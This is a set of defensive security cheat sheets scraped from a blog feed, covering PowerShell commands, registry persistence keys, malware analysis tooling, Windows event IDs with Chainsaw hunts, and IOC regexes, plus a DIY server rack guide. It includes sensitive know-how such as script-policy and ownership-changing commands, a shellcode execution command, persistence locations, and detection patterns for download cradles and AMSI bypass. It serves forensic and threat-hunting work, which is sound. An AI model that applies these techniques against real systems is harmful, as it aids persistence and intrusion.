systeminfo # Display all system information ps # Get-Process – List all processes ps | ? {$_.Name -like \u0026#34;*app*\u0026#34;} # Where-Object – Filter by name While(1) {ps | sort -des cpu | select -f 15 | ft -a; sleep 1; cls} # Real-time monitor uptime # Get-Uptime – System uptime (PowerShell 7+) whoami # whoami – Current user (native cmd) hostname # hostname – System hostname gcim Win32_OperatingSystem | select Version # Get OS version Network Commands # ipconfig # Network info netstat -an # Active connections netstat -anb # Add -b for process names Get-NetTCPConnection # List TCP connections ping 8.8.8.8 # Test network iwr http://example.com # Invoke-WebRequest – Fetch content nslookup domain.com # DNS lookup Permissions \u0026amp; Ownership # icacls file.txt # View permissions icacls file.txt /grant User:F # Grant full permissions to User takeown /f file.txt # Take ownership Start-Process powershell -v runAs # Run as Administrator App \u0026amp; Service Management # ii . # Invoke-Item . – Open folder in Explorer ii file.pdf # Invoke-Item – Open file with default app Start notepad.exe # Start-Process – Launch app kill -n notepad # Stop-Process -Name – Kill by name ps | ? {$_.MainWindowTitle -like \u0026#34;*text*\u0026#34;} | kill # Filter + kill Package Managers # winget install name # Install package winget upgrade # Update all packages winget list # List installed packages winget uninstall name # Uninstall package Scripting \u0026amp; Automation # # Requires -Version X.0 \u0026#39;Hello Windows\u0026#39; | Out-Host Set-ExecutionPolicy Unrestricted # Allow scripts Unblock-File .\\hello.ps1 .\\hello.ps1 # Run script Disk \u0026amp; Mounting # Get-Volume # List volumes mountvol # Volume mount info Get-Disk # Physical disks File Hashing # Get-FileHash file.txt # Compute SHA256 hash (default) Get-FileHash file.txt -a SHA1 # Compute SHA1 hash (Get-FileHash file.txt).Hash # Output just the hash string # Compare two files if ((Get-FileHash file1.txt).Hash -eq (Get-FileHash file2.txt).Hash) { \u0026#34;Files are identical\u0026#34; } else { \u0026#34;Files differ\u0026#34; } Misc # Get-Date # Show date/time history # Get-History – Show command history clear # Clear-Host – Clear screen Suggested Tools # Tool Purpose PowerToys Productivity \u0026amp; window manager Windows Terminal Modern tabbed terminal Winget Official package manager Sysinternals Advanced diagnostics Autoruns Show auto-start programs Process Explorer Visual process manager ","date":"8 June 2025","externalUrl":null,"permalink":"/posts/windows_powershell_cheatsheet/","section":"Blog","summary":"Fast-access PowerShell reference for system administration, automation, security auditing, covering file management, networking, scripting, and Winget for IT pros and analysts.","title":"Windows CLI Commands Cheat Sheet","type":"posts"},{"content":"This cheat sheet offers a concise guide to key Windows Registry locations and artefacts used in malware analysis, forensic investigations, and threat detection. It includes common persistence mechanisms, user activity traces, and system configuration paths, alongside valuable tips for hunting indicators of compromise (IOCs). Ideal for DFIR professionals and red/blue team operations.\nKey Hive Overview # Hive Abbreviation Description File Location HKEY_LOCAL_MACHINE HKLM System-wide settings %SystemRoot%\\System32\\Config HKEY_CURRENT_USER HKCU Current user settings C:\\Users\\[user]\\NTUSER.DAT HKEY_USERS HKU All loaded user hives Mirrors NTUSER.DAT Static Analysis of HKCU # For forensics and general static analysis, HKEY_CURRENT_USER must be accessed through HKEY_USERS using the user’s SID:\nLook up SIDs from one of these locations:\nRegistry Path Purpose HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList All user profiles HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI Most recent user Replace:\nHKCU\\\u0026lt;Key\u0026gt; ➝ HKU\\\u0026lt;SID\u0026gt;\\\u0026lt;Key\u0026gt;\nPersistence \u0026amp; Autostart Locations # Key Purpose Registry Path Common Misuse Startup – Run key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Startup persistence RunOnce key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce One-time execution Services HKLM\\SYSTEM\\CurrentControlSet\\Services\\\u0026lt;ServiceName\u0026gt; Malicious service creation NSSM service config HKLM\\SYSTEM\\CurrentControlSet\\Services\\\u0026lt;ServiceName\u0026gt;\\Parameters NSSM-based persistence Scheduled Tasks HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\\u0026lt;TaskName\u0026gt; Scheduled task abuse Winlogon Shell key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell Shell hijacking Image File Execution Options (IFEO) HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\u0026lt;AppName\u0026gt;\\Debugger Binary hijacking/debugger abuse User Activity # Key Purpose Registry Path Last logged-in user HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI Recent documents HKU\\\u0026lt;SID\u0026gt;\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs Typed folder paths HKU\\\u0026lt;SID\u0026gt;\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths Run dialog history HKU\\\u0026lt;SID\u0026gt;\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU Mapped drives HKU\\\u0026lt;SID\u0026gt;\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU RDP history HKU\\\u0026lt;SID\u0026gt;\\Software\\Microsoft\\Terminal Server Client\\Default System Information # Description Registry Path RDP Enabled HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\ System Timezone HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation USB Device History HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR Mounted Drives HKLM\\SYSTEM\\MountedDevices Artefact Traces # Artefact Type Registry Path File extension behaviour HKLM\\Software\\Classes\\\u0026lt;file_extension\u0026gt;\\Shell\\Open\\Command HKU\\\u0026lt;SID\u0026gt;\\Software\\Classes\\\u0026lt;file_extension\u0026gt;\\Shell\\Open\\Command Environment Variables HKU\\\u0026lt;SID\u0026gt;\\Environment, HKLM\\Environment Tools for Registry Analysis # Tool Use RegRipper Plugin-based hive parser (automated) Registry Explorer GUI-based visual inspection RECmd CLI registry exploration YARP Python-based hive parser RegShot Compare registry snapshots (before/after) Registry Threat Hunting Tips # Look for:\nAuto-start entries in suspicious paths IFEO hijacks without legitimate debugging reason Services with suspicious image paths or arguments Encoded/obfuscated payloads in values Unusual keys in Run, RunOnce, Shell Sysmon Registry Event IDs # Event ID Description 12 Registry key object created or deleted 13 Registry value set 14 Registry object renamed ","date":"3 June 2025","externalUrl":null,"permalink":"/posts/windows_registry_cheatsheet/","section":"Blog","summary":"Key Windows Registry locations for persistence mechanisms, user activity traces, and IOC hunting in malware analysis and forensic investigations for DFIR professionals.","title":"Windows Registry Cheat Sheet","type":"posts"},{"content":"Author: Lenny Zeltser | License: Creative Commons v3 “Attribution”\nMore at zeltser.com/cheat-sheets\n1. Malware Analysis Process # Overview of the Malware Analysis Process # Use automated analysis sandbox tools for an initial assessment of the suspicious file. Set up a controlled, isolated laboratory in which to examine the malware specimen. Examine static properties and metadata of the specimen for triage and early theories. Emulate code execution to identify malicious capabilities and contemplate next steps. Perform behavioural analysis to examine the specimen’s interactions with its environment. Analyze relevant aspects of the code statically with a disassembler and decompiler. Perform dynamic code analysis to understand difficult aspects of the code. If necessary, unpack the specimen. Repeat steps 4–8 until analysis objectives are met. Augment your analysis using methods like memory forensics and threat intel. Document findings, save analysis artifacts, and clean up the laboratory. Behavioural Analysis # Use virtualisation tools for system snapshots (Clonezilla, PXE, FOG, dd). Monitor local interactions: Process Hacker, Process Monitor, ProcDOT, Noriben Detect system changes: RegShot, Autoruns Monitor network traffic: Wireshark, Fiddler Redirect traffic: fakedns, accept-all-ips Simulate services: INetSim or actual service setup Ghidra for Static Code Analysis # Action Shortcut Go to location g Show references Ctrl+Shift+F Insert comment ; Follow jump or call Enter Previous/Next location Alt+Left / Alt+Right Undo Ctrl+Z Define data type t Add bookmark Ctrl+D Text search Ctrl+Shift+E Add/edit label l Disassemble d x64dbg/x32dbg for Dynamic Code Analysis # Action Shortcut/Command Run code F9 Step into / over F7 / F8 Execute until instruction F4 Execute until return Ctrl+F9 Previous/Next executed instruction - / + Return to previous view * Go to expression Ctrl+G Comment / Label ; / : Show current function graph g Set breakpoint (instruction/API) F2 / SetBPX APIName Highlight occurrences h and click keyword Assemble instruction Spacebar Edit data in memory Ctrl+E Extract API call references Right-click → Search for → Current module → Intermodular calls Unpacking Malicious Code # Detect packing: Detect It Easy, Exeinfo PE, Bytehist, peframe Quick unpack: Infect VM and dump memory with Scylla Precise unpack: Find OEP (Original Entry Point) via debugger Use OllyDumpEx Set breakpoints on APIs: LoadLibrary, VirtualAlloc, etc. Use memory breakpoints at stack entry Rebuild dumped file with Scylla, pe_unmapper If dumping fails, use dynamic analysis live Bypassing Other Analysis Defences # Decode obfuscated strings: Static: FLOSS, xorsearch, Balbuzard Runtime: Set breakpoints and inspect memory Hide analysis tools: Use ScyllaHide plugin for x64dbg Patch out anti-analysis code manually Watch for tricky control flows: TLS, SEH, RET, CALL Use scdbg and runsc for shellcode Disable ASLR with setdllcharacteristics, CFF Explorer 2. Analyzing Malicious Documents # General Approach to Document Analysis # Examine the document for anomalies, such as risky tags, scripts, and embedded artifacts. Locate embedded code, such as shellcode, macros, JavaScript, or other suspicious objects. Extract suspicious code or objects from the file. If relevant, deobfuscate and examine macros, JavaScript, or other embedded code. If relevant, emulate, disassemble and/or debug extracted shellcode. Understand the next steps in the infection chain. Microsoft Office Format Notes # OLE2 Format (.doc, .xls, etc.): Binary; can store older macro versions in SRP streams. OOXML Format (.docx, .xlsm, etc.): ZIP-compressed; VBA inside OLE2 binary within ZIP. XLM Macros: Excel formulas, even without binary OLE2 stream. RTF: No macros, but supports embedded malicious objects. Useful MS Office File Analysis Commands # zipdump.py file.pptx # Examine OOXML contents zipdump.py file.pptx -s 3 -d # Extract file index 3 olevba file.xlsm # Extract macros oledump.py file.xls -i # List OLE2 streams oledump.py file.xls -s 3 -v # Extract VBA code xmldump.py pretty # Format XML for analysis oledump.py file.xls -p plugin_http_heuristics # Find obfuscated URLs vmonkey file.doc # Emulate macro execution evilclippy -uu file.ppt # Remove macro password msoffcrypto-tool infile.docm outfile.docm -p # Decrypt file pcodedmp file.doc # Disassemble stomped VBA pcode2code file.doc # Decompile stomped VBA Risky PDF Keywords # /OpenAction, /AA: Auto-run scripts /JavaScript, /JS, /AcroForm, /XFA: Embedded scripts /URI, /SubmitForm, /GoToR: URL redirection /ObjStm, /XObject: Hidden objects or images (phishing) Be mindful of hex obfuscation (e.g. /J#61vaScript) Useful PDF File Analysis Commands # pdfid.py file.pdf -n # Show risky keywords pdf-parser.py file.pdf -a # Show stats pdf-parser.py file.pdf -o ID # Display object ID pdf-parser.py file.pdf -r ID # Objects referencing ID qpdf --password=pass --decrypt infile.pdf outfile.pdf Shellcode and Other Analysis Commands # xorsearch -W -d 3 file.bin # Locate shellcode scdbgc /f file.bin # Emulate shellcode runsc32 -f file.bin -n # Execute shellcode base64dump.py file.txt # Detect base64 strings numbers-to-string.py file # Convert encoded numbers Additional Document Analysis Tools # JavaScript Deobfuscation: SpiderMonkey, cscript, box-js Office Macro Debugging: Use built-in debugger in isolation Macro Monitoring: AMSIScriptContentRetrieval.ps1 Automation: Use sandbox environments Distributions: REMnux includes many free analysis tools 3. Reverse Engineering Malicious Code # Overview of the Code Analysis Process # Examine static properties of the executable. Identify strings and API calls for suspicious indicators. Use behavioural analysis (manual + automated). Emulate to find characteristics. Statical disassembly + decompilation. Dynamic debugging of API usage. Unpack code if needed. Annotate functions, rename variables. Expand analysis based on known code. Repeat steps 5–9 until objectives are met. Common 32-Bit Registers and Uses # Register Purpose EAX General purpose (math, return values) ECX Loop counter EBP Stack frame base ESP Stack top pointer EIP Instruction pointer EFLAGS Flags from arithmetic logic FS Thread environment block (e.g., FS:[0]) Common x86 Assembly Instructions # mov EAX, 0xB8 ; Load value into register push EAX ; Push onto stack pop EAX ; Pop from stack lea EAX, [EBP-4] ; Load effective address call EAX ; Call function by address add ESP, 8 ; Adjust stack xor EAX, EAX ; Zero a register test EAX, EAX ; Check if zero cmp EAX, 0xB8 ; Compare values Understanding 64-Bit Registers # 32-bit → 64-bit: EAX → RAX, ECX → RCX, etc. Registers R8–R15 added Argument passing: RCX, RDX, R8, R9 on 64-bit [EBP+8], [EBP+0xC]\u0026hellip; on 32-bit Decoding Conditional Jumps # Mnemonic Meaning JA/JG Jump if above/greater JB/JL Jump if below/less JE/JZ Jump if equal (zero) JNE/JNZ Jump if not equal (not zero) JGE/JNL Jump if greater or equal Risky Windows API Calls # Code injection: CreateRemoteThread, WriteProcessMemory DLL loading: LoadLibrary, GetProcAddress Data theft: GetClipboardData, GetWindowText Keylogging: GetAsyncKeyState, SetWindowsHookEx Self-injection: VirtualAlloc, VirtualProtect Execution: CreateProcess, WinExec Web traffic: InternetOpen, HttpSendRequest Additional Code Analysis Tips # Use dynamic analysis if static stalls Map control flow via jumps and calls Prefer simplicity: work from known to unknown Research official \u0026amp; native API names (Nt*, Zw*, Rtl*) 4. Tooling # Analyze Windows Executables # Static: manalyze, peframe, pefile, exiftool, clamscan, pescan, portex, bearcommander, pecheck Strings \u0026amp; Deobfuscation: pestr, bbcrack, brxor.py, base64dump, xorsearch, flarestrings, floss, cyberchef Emulation: binee, capa, vivbin Disassemblers: ghidra, cutter, objdump, r2 Unpackers: bytehist, de4dot, upx Reverse-Engineer Linux Binaries # Static: trid, exiftool, pyew, readelf.py Disassemblers: ghidra, cutter, objdump, r2 Debuggers: edb, gdb Runtime tools: ltrace, strace, frida, sysdig, unhide Investigate Other Forms of Malicious Code # Android: apktool, droidlysis, androgui.py, baksmali, dex2jar Java: cfr, procyon, jad, jd-gui, idx_parser.py Python: pyinstxtractor.py, pycdc JavaScript: js, js-file, objects.js, box-js Shellcode: shellcode2exe.bat, scdbg, xorsearch PowerShell: pwsh, base64dump Flash: swfdump, flare, flasm, swf_mastah.py, xxxswf Examine Suspicious Documents # Office: vmonkey, pcodedmp, olevba, xlmdeobfuscator, oledump.py, msoffice-crypt, ssview RTF: rtfobj, rtfdump Emails: emldump, msgconvert PDFs: pdfid, pdfparser, pdfextract, pdfdecrypt, peepdf, pdftk, pdfresurrect, qpdf, pdfobjflow General: base64dump, tesseract, exiftool Explore Network Interactions # Monitoring: burpsuite, networkminer, polarproxy, mitmproxy, wireshark, tshark, ngrep, tcpxtract, tcpick Connecting: thug, nc, tor, wget, curl, irc, ssh, unfurl Services: fakedns, fakemail, accept-all-ips, nc, httpd, inetsim, fakenet, sshd, myip Gather and Analyze Data # Network: Automater.py, shodan, ipwhois_cli.py, pdnstool Hashes: malwoverview.py, nsrllookup, Automater.py, vt, virustotal-search.py Files: yara, scalpel, bulk_extractor, ioc_writer Other: dexray, viper, time-decode.py Other Analysis Tasks – Memory Forensics \u0026amp; File Utilities # Memory Forensics: vol.py, vol3, linux_mem_diff.py, aeskeyfind, rsakeyfind, bulk_extractor File Editors: wxHexEditor, scite, code, xpdf, convert Extractors: 7z, unzip, unrar, cabextract 5. REMnux Tips for Malware Analysis on Linux # Get Started with REMnux # Install REMnux via VM, dedicated system, or on existing distro Docs: docs.remnux.org Keep updated: remnux upgrade and remnux update Use Docker-based tools Default login: remnux/malware Operate Your REMnux System # shutdown # Power off reboot # Reboot sudo -s # Root shell renew-dhcp # Renew DHCP lease myip # Show IP address code file # Edit text feh file # View image httpd start # Start web server sshd start # Start SSH Use Docker Containers for Analysis # remnux/thug, remnux/jsdetox, remnux/retdec remnux/viper, remnux/radare2 Interact with Docker Images # docker images # List images docker pull \u0026lt;image\u0026gt; # Update image docker rmi \u0026lt;image_id\u0026gt; # Remove image docker system prune # Clean up docker run --rm -it image bash # Run container shell docker run -p 80:80 image bash # Map port docker run -v .:/data image bash # Mount directory ","date":"2 June 2025","externalUrl":null,"permalink":"/posts/malware-analysis-cheat-sheet/","section":"Blog","summary":"Comprehensive reference for static and dynamic malware analysis using Ghidra, x64dbg, REMnux, including PDF analysis, unpacking techniques, and reverse engineering workflows. - static-analysis - dynamic-analysis","title":"Malware Analysis Cheat Sheet","type":"posts"},{"content":"This Windows Event Logs cheat sheet is designed for digital forensics, threat hunting, and security event analysis. It summarises critical Windows event IDs, logon types, and log source locations (Security.evtx, System.evtx, PowerShell logs, and more). Perfect for SOC analysts, incident responders, and malware investigators, this guide helps identify suspicious activity and map attack chains using native event logs.\nImportant Event IDs by Log Source # Security.evtx # C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n4624 # Account successfully logged on (watch types 2, 3, 10, 11) 4625 # Account failed to log on (watch for error codes and type) 4634 # Account successfully logged off 4648 # Logon attempt using explicit credentials (pass-the-hash indicator) 4672 # Special privileges assigned to new logon (admin logon) 4688 # A new process has been created (monitor parent-child chains) 4697 # Service installation detected 4698 # Scheduled task creation 4699 # Scheduled task deletion 4700 # Scheduled task enabled 4701 # Scheduled task disabled 4702 # Scheduled task updated/modified 4720 # A user account was created 4722 # A user account was enabled 4723 # A user attempted to change password 4724 # A user reset another user’s password 4732 # Account added to a group 4733 # Account removed from a group 4736 # Account deleted 4738 # User account changed 4740 # A user account was locked out 4767 # A user account was unlocked 4768 # Kerberos authentication ticket (TGT) requested 4769 # Kerberos service ticket requested (TGS) 4770 # Kerberos service ticket renewed 4771 # Kerberos pre-authentication failed (watch for 0x18, 0x10, 0x17) 4776 # DC attempted to validate credentials 4778 # RDP session reconnected 4779 # RDP session disconnected 1102 # Audit log cleared (potential anti-forensic) 4614 # Security system extension loaded (can indicate new security packages) Logon Type Breakdown (4624 / 4625) # Type Description 0 System (used internally by the OS) 2 Interactive (user at keyboard) 3 Network (SMB, RDP with NLA) 4 Batch (Scheduled Task) 5 Service (Service account logon) 7 Unlock (user unlocked workstation) 8 NetworkCleartext (credentials sent in cleartext) 9 NewCredentials (RunAs /netonly) 10 RemoteInteractive (Terminal Services/RDP) 11 CachedInteractive (domain unreachable, cached creds) 12 CachedRemoteInteractive (auditing remote cached login) 13 CachedUnlock (unlock using cached credentials) System.evtx # C:\\Windows\\System32\\winevt\\Logs\\System.evtx\n6005 # Event log service started (system boot) 6006 # Event log service stopped (clean shutdown) 6008 # Unexpected shutdown 7036 # Service state change 7040 # Service start type change (e.g., auto → manual) 7045 # New service installed Application.evtx # 1000 # Application error (useful for malware crashing) 1026 # .NET Runtime error (malicious .NET payloads may trigger this) App-specific # Look for entries from security tools (AV, EDR, backup failures, etc.) PowerShell Operational # C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx\n4100 # PowerShell engine state change 4103 # Module logging (e.g., internal commands, pipelines) 4104 # Script block logging (critical for threat hunting) 4105 # Script block rejected by policy 4106 # Script block execution started Windows Defender Operational # C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Windows Defender%4Operational.evtx\n1116 # Malware detected 1117 # Malware action taken (e.g. removed, quarantined) 1118 # Malware remediation failed 5001 # Real-time protection disabled 5004 # Real-time protection restored 5007 # Configuration change (may indicate tampering) 1006 # Scan started 1007 # Scan completed Sysmon.evtx # C:\\Windows\\System32\\winevt\\Logs\\Sysmon.evtx\n1 # Process creation (command-line, parent, hashes) — must-have 3 # Network connection (IP, port, process) — beaconing, C2 7 # Image loaded (DLLs, LOLBins) — great for lateral movement/abuse 10 # Process access (injection, token theft) — attack surface 11 # File created (sensitive paths) — payload delivery 12 # Registry object created/deleted — persistence, tampering 13 # Registry value set — auto-run keys, config mods 22 # DNS query (process + domain) — domain-based IOCs 25 # Process tampering (hollowing, manipulation) — evasive malware Chainsaw Usage # Basic Hunt # chainsaw hunt --directory ./evtx --rules ./sigma Search by Event ID # # Chainsaw v1 chainsaw search log.evtx -e 4104 # Chainsaw v2 chainsaw search log.evtx -t \u0026#34;Event.System.EventID: =4104\u0026#34; Search by String Match # # Chainsaw v1 chainsaw search log.evtx -s \u0026#34;IEX\u0026#34; # Chainsaw v2 chainsaw search log.evtx -e \u0026#34;IEX\u0026#34; Timestamp Filtering # # Chainsaw v1 – string-based date filtering chainsaw search ./ -s \u0026#34;2025-06-29\u0026#34; # Chainsaw v2 – structured timestamp filtering chainsaw search ./ \\ --timestamp Event.System.TimeCreated_attributes.SystemTime \\ --from 2022-06-21T00:00:00 \\ --to 2025-06-29T00:00:00 Useful Chainsaw Searches # Security.evtx # # 4624 - Logons chainsaw search log.evtx -e 4624 -i -s \u0026#34;JoeBloggs\u0026#34; | grep -i \u0026#34;ipaddress\u0026#34; | sort | uniq -c | sort -nr # Count all ip addresses obervered for a particular user chainsaw search log.evtx -e 4624 -i -s \u0026#34;username_or_ip\u0026#34; | grep -iE \u0026#34;ipaddress|targetusername|logontype|systemtime\u0026#34; # Show users or ip logon time and type Hint: remove \u0026#34;-i -s \u0026#34;Username/IP\u0026#34;\u0026#34; to show all users # 4625 - Failed Logons chainsaw search log.evtx -e 4625 | grep -i targetusername | sort | uniq -c | sort -nr # Count Failed Logon for each user, useful for brute force chainsaw search log.evtx -e 4625 -i -s \u0026#34;JoeBloggs\u0026#34; | grep -i systemtime # Display time for each logon for specific users System.evtx # # 7045 - Service Creation chainsaw search log.evtx -e 7045 -i -s \u0026#34;service_name\u0026#34; | grep -iE \u0026#34;ImagePath|ServiceName|SystemTime\u0026#34; # Show Service Creation Details Powershell Operational # # 4014 - Powershell Script Blocks chainsaw search log.evtx -e 4104 | grep -i \u0026#34;scriptblocktext\u0026#34; # Show just the clear text script block chainsaw search log.evtx -e 4104 | grep -i \u0026#34;IEX\u0026#34; | sort | uniq -c # Script blocks containing text \u0026#34;IEX\u0026#34; \u0026lt;- Change for desired string/command Look for 4104 events with: IEX, Invoke-WebRequest, New-Object Obfuscated/encoded strings (FromBase64String) Check for AMSI bypass or download cradle patterns Correlate with 4688 for execution chain context Useful Tools for Static Analysis # Tool Use Chainsaw Fast hunting with Sigma EvtxECmd Convert .evtx to CSV EventLog Explorer GUI log viewer KAPE Forensic triage Sigma Rule format used by Chainsaw Hayabusa Log Parser ","date":"2 June 2025","externalUrl":null,"permalink":"/posts/windows_logs_cheatsheet/","section":"Blog","summary":"Critical Windows event IDs, logon types, and log locations for threat hunting and incident response, including Security.evtx, PowerShell logs, and Chainsaw analysis techniques.","title":"Windows Log Analysis Cheat Sheet (+ Chainsaw)","type":"posts"},{"content":"Build your own compact and modular mini server rack using 2020 aluminium extrusion. This guide will walk you through the parts, tools, and steps needed to assemble a rack suitable for home labs or networking gear.\nParts List # Quantity Item Link 8x 2020 Aluminium Extrusion – 800mm uxcell – Amazon AU 8x 2020 Aluminium Extrusion Corner Brackets Amazon AU 50x M5 Spring-Loaded T-Nuts Amazon AU 50x M5 × 8mm Bolts Amazon AU 1x Rack Shelf GeeekPi Shelf – Amazon AU 1x Mini ITX Mount GeeekPi Mount or Short Depth Rackmount 1x Patch Panel GeeekPi Panel or Printable Patch Panel 1x Drive Bay Adapter SilverStone 5.25\u0026quot; to 3.5\u0026quot; + Drive Bay Bracket - Thingiverse 1x Power Rail Printable 7-Port C13 Rail 3x Dell OptiPlex 7070 eBay AU + Mount – Printables OR 3x HP ProDesk eBay AU Optional Remote Management JetKVM Tools Required # Mitre saw (suitable for aluminium) Allen key set Measuring tape Marker or pencil Aluminium Extrusion Cut List # Measure and cut your 800mm 2020 extrusions down to:\n4 × 160mm – Depth 4 × 218mm – Width 4 × Height, calculated as:\nHeight = (45mm × Desired Rack Units) + 40mm\ne.g. for 6U: (45 × 6) + 40 = 310mm Aluminium can be cut cleanly with a standard mitre saw.\nAssembly Instructions # 1. Assemble Frame # Form top and bottom rectangles with 2× width (218mm) and 2× depth (160mm) extrusions. Use the corner brackets to secure each corner. Attach the vertical height extrusions to the four corners of one rectangle, then attach the other rectangle to complete the frame. 2. Insert Spring Nuts # Insert M5 spring-loaded nuts into the extrusion channels at an angle until they “click” into place. Slide them to the desired height to mount brackets, shelves, or other accessories. 3. Install Components # Mount your accessories using M5 × 8mm bolts and T-nuts:\nRack shelves Mini ITX mount Drive bay Patch panel Power rail Custom mounts (e.g. for Dell 7070 or HP ProDesk) 4. Optional Add-ons # Mount cooling fans or mesh panels to sides/back. Add rubber feet or small castors for mobility. Paint or vinyl-wrap the frame for aesthetics. Tips \u0026amp; Notes # Standard rack width is 10\u0026quot; for this mini format. Keep at least 1U free for airflow and future additions. Preload extra spring nuts into the frame before full assembly to save time later. Cable management can be done using adhesive clips, zip ties, or printed brackets. My Racks Layout (16U Rack) # Front # Unit Component 1U Patch Panel (Ethernet) 2U Firewall 1U Patch Panel (Rear IO) 3U Dell 7070 x3 3U HDD Drive Bay 3U Mini ITX or ProDesk Rear # Unit Component 1U Patch Panel 2U Shelf (Power Supplys) 1U Power Rail ","date":"28 May 2025","externalUrl":null,"permalink":"/posts/my_rack_setup/","section":"Blog","summary":"Build your own compact 10-inch server rack using 2020 aluminium extrusion with detailed parts list, cut measurements, and assembly instructions for a modular homelab setup.","title":"My Rack Setup - 2020 Extrusion DIY mini-rack","type":"posts"},{"content":"This regex reference outlines essential components for pattern matching, capturing, and string manipulation, drawn from DaveChild’s widely used Regular Expressions cheat sheet, but adapted for security analysts, blue teamers, and SOC professionals.\nThe Basics # . # Any character except newline * # 0 or more of the previous + # 1 or more of the previous ? # 0 or 1 of the previous | # OR operator () # Group expressions [] # Character class [^] # Negated character class {n,m} # Repeat n to m times \\d # Digit (0-9) \\w # Word character (a-zA-Z0-9_) \\s # Whitespace \\. # Escape literal dot with \\. Common IOC Search Patterns # https?:\\/\\/[\\w.-]+(?:\\/[\\w\\/._%-]*)? # Website [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.] # Email address \\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b # IPv4 address ([a-fA-F0-9]{1,4}:){7}[a-fA-F0-9]{1,4} # IPv6 address [A-Z]:\\\\(?:[\\w\\s.-]+\\\\)*[\\w\\s.-]+ # Windows path \\/(?:[\\w.-]+\\/)*[\\w.-]+ # Unix/Linux path ([\u0026#34;\u0026#39;])([\\w\\/]+)\\1 # Variables from scripts (?:[A-Za-z0-9+/]{4}){2,}(?:==|=)? # Base64 Tooling Tips # Use regex101.com or CyberChef for testing and debugging. Double-escape backslashes (\\\\) when pasting into JSON/Sigma rules. Use SIEM-specific syntax for anchors (e.g., ^, $ may not always be needed). Be cautious with overly greedy expressions in detection logic. Useful Tools for Regex\nTool Use CyberChef Decode, deobfuscate, extract strings YARA Combine regex with memory/file scanning Sigma Detection rules with regex support Regex101 Online regex tester with explanation Elastic Full regex support in queries Regexper Regex Visualiser Advanced Patterns # Content adapted from DaveChild | More at https://cheatography.com/\nAnchors # ^ Start of string, or start of line in multi-line mode \\A Start of string $ End of string, or end of line in multi-line mode \\Z End of string \\b Word boundary \\B Not word boundary \\\u0026lt; Start of word \\\u0026gt; End of word Character Classes # \\c Control character \\s Whitespace \\S Not whitespace \\d Digit \\D Not digit \\w Word character \\W Not word character \\x Hexadecimal digit \\O Octal digit POSIX Character Classes # [:upper:] Uppercase letters [:lower:] Lowercase letters [:alpha:] All letters [:alnum:] Digits and letters [:digit:] Digits [:xdigit:] Hexadecimal digits [:punct:] Punctuation [:blank:] Space and tab [:space:] Blank characters [:cntrl:] Control characters [:graph:] Printed characters (no space) [:print:] Printed characters and spaces [:word:] Digits, letters and underscore Assertions # (?=...) Lookahead assertion (?!...) Negative lookahead (?\u0026lt;=...) Lookbehind assertion (?\u0026lt;!...) Negative lookbehind (also written as ?!=) (?\u0026gt;...) Once-only subexpression (?(cond)...) Condition [if then] (?(cond)...|...) Condition [if then else] (?#...) Comment Quantifiers # * 0 or more + 1 or more ? 0 or 1 {3} Exactly 3 {3,} 3 or more {3,5} 3, 4 or 5 *? +? ?? {n,m}? Add ? to make it ungreedy Escape Sequences # \\ Escape the following character \\Q Begin literal sequence \\E End literal sequence Escaping allows treating special regex characters as literals.\nCommon Metacharacters # ^ [ . $ { * ( \\ + ) | ? \u0026lt; \u0026gt; Escape them with \\ when used literally.\nSpecial Characters # \\n New line \\r Carriage return \\t Tab \\v Vertical tab \\f Form feed \\xxx Octal character xxx \\xhh Hex character hh Groups and Ranges # . Any character except newline (\\n) (a|b) a or b (...) Capturing group (?:...) Non-capturing group [abc] a or b or c [^abc] Not a, b or c [a-q] Lowercase a to q [A-Q] Uppercase A to Q [0-7] Digit 0 to 7 \\1, \\2, ... Refer to matched group 1, 2, etc. Ranges are inclusive.\nPattern Modifiers (Flags) # g Global match i Case-insensitive m Multi-line mode s Treat string as single line (dot matches newline) x Allow comments and whitespace e Evaluate replacement (rare/legacy use) U Make quantifiers ungreedy by default Flags are applied outside the pattern, like /pattern/gi\nString Replacement # $n nth non-passive group $1 First captured group $2 Second captured group $\u0026amp; Entire matched string $` Text before the match $\u0026#39; Text after the match $+ Last matched group Some engines use \\1, \\2, etc., instead of $1, $2.\n","date":"28 June 2025","externalUrl":null,"permalink":"/posts/regex_cheatsheet/","section":"Blog","summary":"Essential regex patterns for matching, capturing, and string manipulation adapted for security analysts, blue teamers, and SOC professionals working with detection rules.","title":"Regex Cheat Sheet","type":"posts"},{"content":"This IP and domain investigation reference sheet outlines essential techniques and tools for assessing suspicious infrastructure in cybersecurity contexts. It supports triage, reputation analysis, WHOIS lookups, DNS inspection, passive intelligence, and safe payload retrieval. Tailored for analysts, incident responders, threat hunters, and DFIR professionals, it streamlines workflows for identifying malicious indicators, uncovering historical associations, and making informed decisions during investigations.\nImmediate Questions to Ask # Is this a public IP or private/reserved? Is the domain newly registered, sinkholed, or typosquatted? Is the IP on threat feeds or blacklists? Does it belong to a known cloud/VPN/proxy provider? What are the historical DNS resolutions and WHOIS? Tools for IP \u0026amp; Domain Analysis # Tool Use Case AbuseIPDB Check if IP is reported for malicious activity VirusTotal IP/domain reputation, passive DNS, related IOCs URLScan.io Scan web pages, extract scripts, HTML, and 